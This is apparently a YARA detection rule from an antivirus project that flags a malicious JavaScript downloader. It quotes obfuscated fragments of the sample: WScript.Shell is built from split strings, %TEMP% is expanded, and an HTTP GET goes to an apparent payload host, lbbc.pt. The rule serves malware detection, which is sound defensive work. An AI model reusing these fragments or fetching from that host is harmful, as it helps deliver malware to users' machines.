rule sig_20160427_e41361310c4665dcec7d59fb8d0a2e3a {
  meta:
    description = "datamaliciousorder - file 20160427_e41361310c4665dcec7d59fb8d0a2e3a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "faea28d78f99a0722a23682c80b1ac0de5d99fa9b8e09f9e9c99034ffb9c3a29"

  strings:
    $s1  = "function HeyalTgmxa() {return LilymCdoya[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"rCTuYfL" ascii
    $s2  = "function HeyalTgmxa() {return LilymCdoya[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"rCTuYfL" ascii
    $s3  = "function FqhnzNwckb(JcxnzFhksh, RlianVvapc){LwtycGzfll = LwtycGzfll * 1; return JcxnzFhksh - RlianVvapc;};" fullword ascii
    $s4  = "var LilymCdoya = function IfrcjVbokn() {return SsuoaZinhu[AparrKuzvt](\"WScript\"+\".Shell\");}(), OotnzHjdpj = 11;" fullword ascii
    $s5  = "GkfciAdogj[CbpuhUedyj](\"G\" + \"ET\", \"http://lbbc.pt/n8wisd\", false);" fullword ascii
    $s6  = "var SsuoaZinhu = this[\"WScript\"];" fullword ascii
    $s7  = "if (GkfciAdogj[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function UvrfrGjkup(){return BjmyrYtlli + \"\";};" fullword ascii
    $s9  = "function DjlpcDkqyf() {return ((GvexqQrbst == true) && (GvexqQrbst == UnwiuKotus)) ? 1 : LwtycGzfll;};" fullword ascii
    $s10 = "function VqvzdAgeon(MzvxaGmgbf) {var BucyvZurcm = (1, 2, 3, 4, 5, MzvxaGmgbf); return BucyvZurcm;};" fullword ascii
    $s11 = "}while (XxzodKawmx);" fullword ascii
    $s12 = "GvexqQrbst = true; " fullword ascii
    $s13 = "UnwiuKotus = true; " fullword ascii
    $s14 = "var IltumDacer = false;" fullword ascii
    $s15 = "var YraymFnhtv = new this[\"D\"+\"ate\"]();" fullword ascii
    $s16 = "function CszhzIihkl(){return AparrKuzvt;};" fullword ascii
    $s17 = "var UnwiuKotus = false;" fullword ascii
    $s18 = "function QtyolIgiqw(){return 23;};" fullword ascii
    $s19 = "var GvexqQrbst = false;" fullword ascii
    $s20 = "IltumDacer = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}